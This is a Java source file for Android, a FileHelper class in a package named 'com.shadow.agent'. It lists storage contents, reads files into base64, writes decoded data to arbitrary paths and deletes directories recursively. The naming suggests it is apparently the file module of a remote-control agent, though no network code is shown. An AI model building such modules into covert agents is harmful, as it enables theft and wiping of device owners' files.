package com.shadow.agent;

import android.content.Context;
import android.os.Environment;
import android.util.Base64;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;

public class FileHelper {

    private static final String TAG = "SHADOW_FILE";
    private final Context context;

    public FileHelper(Context context) {
        this.context = context;
    }

    public JSONArray listFiles(String path, int limit) {
        JSONArray arr = new JSONArray();
        try {
            File dir;
            if (path == null || path.isEmpty()) {
                dir = Environment.getExternalStorageDirectory();
            } else {
                dir = new File(path);
            }
            if (!dir.exists() || !dir.isDirectory()) {
                return arr;
            }

            File[] files = dir.listFiles();
            if (files == null) return arr;

            for (File f : files) {
                if (arr.length() >= limit) break;
                JSONObject o = new JSONObject();
                o.put("name", f.getName());
                o.put("path", f.getAbsolutePath());
                o.put("isDir", f.isDirectory());
                o.put("size", f.length());
                o.put("lastModified", f.lastModified());
                o.put("canRead", f.canRead());
                arr.put(o);
            }
        } catch (Exception e) {
            Log.e(TAG, "List error", e);
        }
        return arr;
    }

    public String readFile(String path) {
        try {
            File f = new File(path);
            if (!f.exists() || !f.canRead()) return null;
            if (f.length() > 5 * 1024 * 1024) return null; // cap 5MB

            FileInputStream fis = new FileInputStream(f);
            byte[] bytes = new byte[(int) f.length()];
            fis.read(bytes);
            fis.close();
            return "data:application/octet-stream;base64,"
                    + Base64.encodeToString(bytes, Base64.NO_WRAP);
        } catch (Exception e) {
            Log.e(TAG, "Read error", e);
            return null;
        }
    }

    public boolean writeFile(String path, String base64Data) {
        try {
            byte[] data = Base64.decode(base64Data, Base64.DEFAULT);
            File f = new File(path);
            File parent = f.getParentFile();
            if (parent != null && !parent.exists()) parent.mkdirs();
            FileOutputStream fos = new FileOutputStream(f);
            fos.write(data);
            fos.close();
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Write error", e);
            return false;
        }
    }

    public boolean deleteFile(String path) {
        try {
            File f = new File(path);
            if (f.isDirectory()) {
                return deleteRecursive(f);
            }
            return f.delete();
        } catch (Exception e) {
            Log.e(TAG, "Delete error", e);
            return false;
        }
    }

    private boolean deleteRecursive(File f) {
        if (f.isDirectory()) {
            File[] children = f.listFiles();
            if (children != null) {
                for (File c : children) deleteRecursive(c);
            }
        }
        return f.delete();
    }
}